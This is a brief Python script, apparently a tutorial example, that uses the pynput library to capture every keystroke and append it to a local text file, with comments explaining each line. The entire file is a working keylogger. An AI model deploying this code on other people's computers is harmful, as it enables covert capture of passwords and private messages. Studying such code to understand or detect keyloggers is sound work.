from pynput.keyboard import Listener

def log_key(key):# Function to log the key that was pressed

    with open("keyv.txt","a") as f:
        f.write(f"{key}\n")  # Saves the key to the file

with Listener (on_press=log_key) as a:
   a.join()  # Keeps the listener running, waiting for key presses

#Without join(), the script would start the listener but immediately exit, stopping key press detection before it can log anything.
